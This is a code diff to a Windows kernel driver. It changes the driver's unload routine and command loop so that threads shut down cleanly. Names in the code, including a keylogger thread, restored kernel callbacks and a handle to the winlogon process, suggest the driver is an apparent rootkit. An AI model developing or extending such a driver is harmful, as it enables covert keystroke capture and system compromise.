@@ -39,14 +39,17 @@ BeUnload()
     LOG_MSG("Unload Called \r\n");
 
     BeGlobals::shutdown = true;
-
-    // Wait for keylogger to stop running TODO: proper signaling via events?
     BeGlobals::logKeys = false;
+
+    // Wait for threads to stop running TODO: proper signaling via events?
+
     LARGE_INTEGER interval;
     interval.QuadPart = -1 * (LONGLONG)500 * 10000;
     KeDelayExecutionThread(KernelMode, FALSE, &interval);
-    // Close thread handle
+
+    // Close thread handles
     ZwClose(hKeyloggerThread);
+    ZwClose(hMainLoop);
 
     // Restore kernel callbacks
     {
@@ -99,7 +102,7 @@ BeUnload()
     ObDereferenceObject(BeGlobals::winLogonProc);
 
     LOG_MSG("Byebye!\n");
-    PsTerminateSystemThread(0);
+    PsTerminateSystemThread(STATUS_SUCCESS);
     return STATUS_SUCCESS;
 }
 
@@ -110,7 +113,7 @@ BeMainLoop(PVOID StartContext)
 
     KAPC_STATE apc;
 
-    while (true) 
+    while (!BeGlobals::shutdown)
     {
         LOG_MSG("Waiting for commandEvent...\n");
         NTSTATUS status = BeWaitForEvent(BeGlobals::commandEvent);
@@ -182,6 +185,8 @@ BeMainLoop(PVOID StartContext)
         BeSetNamedEvent(BeGlobals::answerEvent, TRUE);
         LOG_MSG("Set answerEvent\n");
     }
+
+    PsTerminateSystemThread(STATUS_SUCCESS);
 }
 
 /**
